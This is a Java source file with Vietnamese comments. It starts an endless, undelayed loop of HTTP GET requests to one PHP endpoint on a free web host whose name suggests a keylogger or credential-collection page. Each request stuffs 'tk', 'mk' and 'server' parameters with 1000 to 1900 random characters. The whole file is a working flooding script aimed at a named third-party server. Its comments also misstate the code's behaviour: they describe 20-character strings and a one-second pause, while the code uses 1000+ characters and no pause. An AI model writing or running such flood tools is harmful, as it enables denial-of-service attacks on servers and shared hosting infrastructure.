import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.SecureRandom;

public class FileHTTP implements Runnable {
    private static final String CHARACTERS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    private static final String[] URLS = {
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            // Thêm các đường link khác vào đây
    };

    public static void sendHttpRequest(String urlStr) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setDoOutput(true);
            connection.connect();

            InputStream inputStream = connection.getInputStream();
            new InputStreamReader(inputStream, "UTF-8").close();
            inputStream.close();

            connection.disconnect();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static String generateRandomString(int length) {
        SecureRandom random = new SecureRandom();
        StringBuilder sb = new StringBuilder(length);

        for (int i = 0; i < length; i++) {
            int randomIndex = random.nextInt(CHARACTERS.length());
            char randomChar = CHARACTERS.charAt(randomIndex);
            sb.append(randomChar);
        }

        return sb.toString();
    }

    public void run() {
        while (true) {
            for (String url : URLS) {
                StringBuilder stringBuilder = new StringBuilder();
                stringBuilder.append(url);
                stringBuilder.append("?tk=");
                stringBuilder.append(generateRandomString(1000)); // Sinh chuỗi ngẫu nhiên có 20 ký tự cho phần "tk"
                stringBuilder.append("&mk=");
                stringBuilder.append(generateRandomString(1000)); // Sinh chuỗi ngẫu nhiên có 20 ký tự cho phần "mk"
                stringBuilder.append("&server=");
                stringBuilder.append(generateRandomString(1900)); // Sinh chuỗi ngẫu nhiên có 20 ký tự cho phần "sv"
                sendHttpRequest(stringBuilder.toString());
            }

            try {
                Thread.sleep(0); // Đợi 1 giây trước khi gửi yêu cầu tới các đường link khác
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    public static void main(String[] args) {
        FileHTTP fileHTTP = new FileHTTP();
        Thread thread = new Thread(fileHTTP);
        thread.start();
    }
}
